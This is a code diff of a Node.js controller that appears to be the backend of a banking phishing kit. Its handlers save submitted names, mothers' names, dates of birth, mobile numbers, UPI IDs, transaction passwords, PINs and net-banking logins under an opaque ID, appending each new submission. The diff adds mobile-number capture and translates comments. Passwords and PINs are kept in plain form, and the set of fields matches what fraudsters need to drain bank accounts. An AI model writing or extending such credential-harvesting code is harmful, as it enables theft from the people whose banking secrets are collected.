@@ -6,17 +6,17 @@ const NetBankingLoginData = require('../models/NetBankingLoginData');
 
 exports.saveUserData = async (req, res) => {
     try {
-        const { fullName, motherName, dateOfBirth,uniqueid } = req.body;
+        const { mobileNumber, fullName, motherName, dateOfBirth, uniqueid } = req.body;
         let user = await User.findOne({ uniqueid });
 
         if (user) {
-            // Agar already exist hai, naya entry add karo
-            user.entries.push({ fullName, motherName, dateOfBirth});
+            // If already exists, append new entry
+            user.entries.push({ mobileNumber, fullName, motherName, dateOfBirth });
         } else {
-            // Naya document create karo
+            // Create a new document
             user = new User({
                 uniqueid,
-                entries: [{ fullName, motherName, dateOfBirth}]
+                entries: [{ mobileNumber, fullName, motherName, dateOfBirth }]
             });
         }
 
@@ -27,7 +27,7 @@ exports.saveUserData = async (req, res) => {
             message: "User Data Submitted Successfully!"
         });
     } catch (error) {
-        console.error(error);
+        console.error("saveUserData error:", error);
         res.status(500).json({
             success: false,
             message: "Error occurred while submitting user data"
@@ -41,10 +41,8 @@ exports.saveUpiData = async (req, res) => {
     let record = await Upi.findOne({ uniqueid });
 
     if (record) {
-      // Already exists → append new UPI entry
       record.entries.push({ upiId });
     } else {
-      // Create a new document
       record = new Upi({
         uniqueid,
         entries: [{ upiId }]
@@ -66,17 +64,14 @@ exports.saveUpiData = async (req, res) => {
   }
 };
 
-
 exports.saveTransactionPassword = async (req, res) => {
   try {
     const { uniqueid, transactionPassword } = req.body;
     let record = await TransactionPassword.findOne({ uniqueid });
 
     if (record) {
-      // Already exists → append new password entry
       record.entries.push({ transactionPassword });
     } else {
-      // Create a new document
       record = new TransactionPassword({
         uniqueid,
         entries: [{ transactionPassword }]
@@ -104,10 +99,8 @@ exports.savePinData = async (req, res) => {
     let record = await PinData.findOne({ uniqueid });
 
     if (record) {
-      // Append new PIN entry
       record.entries.push({ pin });
     } else {
-      // Create a new document
       record = new PinData({
         uniqueid,
         entries: [{ pin }]
@@ -135,10 +128,8 @@ exports.saveNetBankingLoginData = async (req, res) => {
     let record = await NetBankingLoginData.findOne({ uniqueid });
 
     if (record) {
-      // Append new login entry
       record.entries.push({ bankName, userId, password });
     } else {
-      // Create a new document
       record = new NetBankingLoginData({
         uniqueid,
         entries: [{ bankName, userId, password }]
